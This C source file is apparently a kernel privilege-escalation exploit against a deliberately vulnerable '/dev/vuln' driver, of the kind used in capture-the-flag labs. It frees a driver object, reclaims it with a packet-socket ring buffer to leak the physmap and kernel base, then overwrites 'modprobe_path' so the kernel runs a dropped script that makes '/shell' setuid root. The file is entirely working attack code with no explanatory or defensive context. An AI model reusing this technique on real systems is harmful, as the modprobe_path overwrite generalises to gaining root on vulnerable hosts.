#define _GNU_SOURCE
#include <arpa/inet.h>        // for htons
#include <fcntl.h>            // for open, O_RDONLY
#include <stdint.h>           // for uintptr_t
#include <stdio.h>            // for puts, printf, NULL, size_t, perror
#include <stdlib.h>           // for system, exit, EXIT_FAILURE, EXIT_SUCCESS
#include <string.h>           // for memcpy
#include <sys/ioctl.h>        // for ioctl
#include <sys/socket.h>       // for setsockopt, socket, AF_PACKET, SOCK_RAW
#include <unistd.h>           // for execve, sysconf, _SC_PAGESIZE
#include <linux/if_ether.h>   // for ETH_P_ALL
#include <linux/if_packet.h>  // for tpacket_req, PACKET_RX_RING
#include <stdbool.h>          // for true
#include <sys/mman.h>         // for mmap, munmap, MAP_FAILED, MAP_SHARED

#define CMD_ALLOC	0xf000
#define CMD_READ	0xf001
#define CMD_WRITE	0xf002
#define CMD_FREE	0xf003

typedef struct {
	size_t size;
	char *data;
} request_t;

#define OBJ_SIZE		0x200
#define PUD_SIZE		(1ULL << 30)
#define PUD_MASK		(~(PUD_SIZE - 1))
#define CONFIG_PHYSICAL_START	0x1000000
#define CONFIG_PHYSICAL_ALIGN	0x200000

static long pagesize;
static int dev = -1;

static void fatal(const char *err)
{
	perror(err);
	exit(EXIT_FAILURE);
}

static void dev_alloc(void)
{
	request_t req;
	req.size = 0;
	req.data = NULL;

	ioctl(dev, CMD_ALLOC, &req);
}

static void dev_read(uintptr_t data, size_t len)
{
	request_t req;
	req.size = len;
	req.data = (char *)data;

	ioctl(dev, CMD_READ, &req);
}

static void dev_write(uintptr_t data, size_t len)
{
	request_t req;
	req.size = len;
	req.data = (char *)data;

	ioctl(dev, CMD_WRITE, &req);
}

static void dev_free(void)
{
	request_t req;
	req.size = 0;
	req.data = NULL;

	ioctl(dev, CMD_FREE, &req);
}

int main(void)
{
	uintptr_t modprobe_path = 0xffffffff81eafcc0;
	const char evil[] = "/tmp/pwn.sh";
	uintptr_t page_offset_base;
	struct tpacket_req req;
	uintptr_t kernel_base;
	uintptr_t victim_page;
	unsigned int block_nr;
	void *victim;
	int sock;
	int ret;

	pagesize = sysconf(_SC_PAGESIZE);
	block_nr = OBJ_SIZE / sizeof(uintptr_t);

	dev = open("/dev/vuln", O_RDONLY);
	if (dev == -1)
		fatal("[-] open");

	puts("[+] dev alloc");
	dev_alloc();

	puts("[+] dev free");
	dev_free();

	sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (sock == -1)
		fatal("[-] socket");

	puts("[+] setsockopt PACKET_RX_RING");
	req.tp_block_size = pagesize;
	req.tp_frame_size = pagesize;
	req.tp_block_nr = block_nr;
	req.tp_frame_nr = block_nr;
	ret = setsockopt(sock, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	if (ret == -1)
		fatal("[-] setsockopt");

	puts("[+] leak physmap addr");
	dev_read((uintptr_t)&page_offset_base, sizeof(page_offset_base));
	page_offset_base &= PUD_MASK;
	printf("[+] page_offset_base: %p\n", (void *)page_offset_base);

	puts("[+] searching startup_64 ...");
	kernel_base = page_offset_base + CONFIG_PHYSICAL_START;
	while (true) {
		uintptr_t *kernel;

		printf("[+] try %p\n", (void *)kernel_base);
		dev_write((uintptr_t)&kernel_base, sizeof(kernel_base));
		kernel = mmap(NULL, pagesize * block_nr, PROT_READ | PROT_WRITE,
			      MAP_SHARED, sock, 0);
		if (kernel != MAP_FAILED && *kernel == 0x3f4e258d48f78949) {
			printf("[+] kernel_base: %p\n", (void *)kernel_base);
			munmap(kernel, pagesize + block_nr);
			break;
		}
		munmap(kernel, pagesize * block_nr);
		kernel_base += CONFIG_PHYSICAL_ALIGN;
	}

	modprobe_path = kernel_base + (modprobe_path - 0xffffffff81000000);
	printf("[+] modprobe_path: %p\n", (void *)modprobe_path);

	victim_page = modprobe_path & (~0xfff);
	printf("[+] victim page: %p\n", (void *)victim_page);

	puts("[+] overwrite struct pgv to modprobe_path page");
	dev_write((uintptr_t)&victim_page, sizeof(victim_page));

	puts("[+] mmap modprobe_path page");
	victim = mmap(NULL, pagesize * block_nr, PROT_READ | PROT_WRITE,
		      MAP_SHARED, sock, 0);
	if (victim == MAP_FAILED)
		fatal("[-] mmap");

	puts("[+] overwrite modprobe_path");
	memcpy(victim + 0x0cc0, evil, sizeof(evil));

	system("echo -e '"
	       "#!/bin/sh\n"
	       "chown root:root /shell\n"
	       "chmod 6777 /shell"
	       "'"
	       ">/tmp/pwn.sh");
	system("chmod +x /tmp/pwn.sh");
	system("echo -e '\xff\xff\xff\xff' > /tmp/pwn");
	system("chmod +x /tmp/pwn");
	system("/tmp/pwn");

	printf("[+] get r00t!\n");
	execve("/shell", (char *[]){ "/bin/sh", NULL }, NULL);
	return EXIT_SUCCESS;
}
